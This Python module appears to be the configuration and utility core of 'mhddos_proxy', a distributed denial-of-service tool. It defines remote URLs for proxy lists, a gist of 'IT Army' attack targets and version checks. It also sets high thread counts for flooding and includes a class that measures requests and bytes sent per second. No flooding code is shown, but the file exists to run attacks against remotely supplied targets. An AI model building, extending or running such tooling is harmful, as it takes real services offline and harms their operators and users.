from asyncio.log import logger as asyncio_logger
import logging
import random
import time
from pathlib import Path
from typing import Tuple

from colorama import Fore


class RemoveUselessWarnings(logging.Filter):

    def filter(self, record):
        return "socket.send() raised exception." not in record.getMessage()


logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
logger = logging.getLogger('mhddos_proxy')
logger.setLevel('INFO')

# Make asyncio logger a little bit less noisy
asyncio_logger.addFilter(RemoveUselessWarnings())


ROOT_DIR = Path(__file__).parent.parent

PROXIES_URLS = (
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies2.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies3.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies4.txt',
)
IT_ARMY_CONFIG_URL = 'https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/mhdos_targets_tcp_v2.txt'
VERSION_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/mhddos_proxy/main/version.txt'

LOW_RPC = 1000
THREADS_PER_CORE = 1000
MAX_DEFAULT_THREADS = 4000
CONFIG_FETCH_RETRIES = 3
CONFIG_FETCH_TIMEOUT = 10
REFRESH_RATE = 5
FAILURE_BUDGET_FACTOR = 4
FAILURE_DELAY_SECONDS = 1
ONLY_MY_IP = 100


class cl:
    MAGENTA = Fore.LIGHTMAGENTA_EX
    BLUE = Fore.LIGHTBLUE_EX
    GREEN = Fore.LIGHTGREEN_EX
    YELLOW = Fore.LIGHTYELLOW_EX
    RED = Fore.LIGHTRED_EX
    RESET = Fore.RESET


class Stats:
    def __init__(self):
        self._requests: int = 0
        self._bytes: int = 0
        self._conns: int = 0
        self._reset_at = time.perf_counter()

    def get(self) -> Tuple[int, int]:
        return self._requests, self._bytes

    def track(self, rs: int, bs: int) -> None:
        self._requests += rs
        self._bytes += bs

    def track_open_connection(self) -> None:
        self._conns += 1

    def track_close_connection(self) -> None:
        self._conns -= 1

    def reset(self) -> Tuple[int, int, int]:
        sent_requests, sent_bytes, prev_reset_at = self._requests, self._bytes, self._reset_at
        self._requests, self._bytes, self._reset_at = 0, 0, time.perf_counter()
        interval = self._reset_at - prev_reset_at
        return int(sent_requests / interval), int(8 * sent_bytes / interval), self._conns
